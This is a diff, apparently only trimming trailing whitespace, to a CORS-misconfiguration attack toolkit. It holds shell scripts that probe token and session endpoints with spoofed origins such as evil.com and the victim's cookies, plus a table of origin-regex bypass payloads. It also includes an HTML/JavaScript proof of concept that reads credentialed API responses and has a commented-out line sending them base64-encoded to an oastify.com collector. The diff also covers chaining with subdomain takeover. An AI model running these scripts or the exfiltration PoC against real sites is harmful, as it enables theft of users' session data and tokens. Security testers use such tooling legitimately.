@@ -149,7 +149,7 @@ TARGET="$1"
 COOKIE="${2:-}"
 PATTERNS=(
   "https://evil.com"
-  "https://eviltarget.com"  
+  "https://eviltarget.com"
   "https://x.target.com.evil.com"
   "null"
 )
@@ -160,15 +160,15 @@ echo "Cookie: ${COOKIE:+present}" >> "$RESULTS_FILE"
 
 for origin in "${PATTERNS[@]}"; do
   echo -e "\n--- Origin: $origin ---" >> "$RESULTS_FILE"
-  
+
   # Test multiple endpoints
   for ep in /api/me /api/user /api/profile /api/session /api/tokens /api/csrf; do
     response=$(curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET$ep" \
       -H "Origin: $origin" ${COOKIE:+-H "Cookie: $COOKIE"} 2>/dev/null)
-    
+
     acao=$(echo "$response" | grep -i "access-control-allow-origin" | tr -d '\r')
     acac=$(echo "$response" | grep -i "access-control-allow-credentials" | tr -d '\r')
-    
+
     [ -n "$acao" ] && echo "  $ep → $acao | ${acac:-no ACAC}" >> "$RESULTS_FILE"
   done
 done
@@ -188,7 +188,7 @@ ENDPOINT="/api/me"
 # Test each bypass class
 declare -A TESTS
 TESTS["Standard-subdomain"]="https://evil.$TARGET"
-TESTS["Missing-dot-separator"]="https://evil${TARGET}"  
+TESTS["Missing-dot-separator"]="https://evil${TARGET}"
 TESTS["Missing-end-anchor"]="https://x.$TARGET.evil.com"
 TESTS["Prefix-only"]="https://$TARGET.evil.com"
 TESTS["Backtick-bypass"]="https://$TARGET%60.evil.com"
@@ -231,21 +231,21 @@ ${SESSION_HINT:+<p>Session hint: <code>${SESSION_HINT}</code></p>}
 (async () => {
   const out = document.getElementById('out');
   const results = [];
-  
+
   try {
     let r = await fetch('https://${TARGET}${ENDPOINT}', {credentials: 'include'});
     let d = await r.text();
     results.push('STATUS: ' + r.status);
     results.push('BODY: ' + d.substring(0, 500));
-    
+
     // OOB exfil (uncomment for proof)
     // await fetch('https://OOB-ID.oastify.com/exfil?d=' + btoa(d));
   } catch(e) {
     results.push('BLOCKED: ' + e.message);
   }
-  
+
   out.textContent = results.join('\\n');
-  
+
   // Additional endpoints
   const extraEndpoints = ['/api/user', '/api/session', '/api/tokens'];
   for (const ep of extraEndpoints) {
@@ -284,7 +284,7 @@ while read line; do
   target=$(echo "$line" | awk '{print $1}')
   cors_type=$(echo "$line" | awk '{print $2}')
   sub_status=$(grep "$target" "$SUB_RESULTS" 2>/dev/null | head -1)
-  
+
   if [ -n "$sub_status" ]; then
     echo "[CHAIN] $target — CORS: $cors_type | Subdomain: $sub_status"
     echo "  -> If CORS trusts *.$target and a subdomain is takeoverable: Critical chain"
@@ -325,7 +325,7 @@ done < "$CORS_RESULTS"
 
 ## Bypass Techniques
 
-| Regex Flaw | Payload | Why | 
+| Regex Flaw | Payload | Why |
 |---|---|---|
 | Missing dot before domain | `https://eviltarget.com` | `.*target\\.com$` matches `eviltarget.com` |
 | Missing end-anchor `$` | `https://x.target.com.evil.com` | regex matches prefix only |
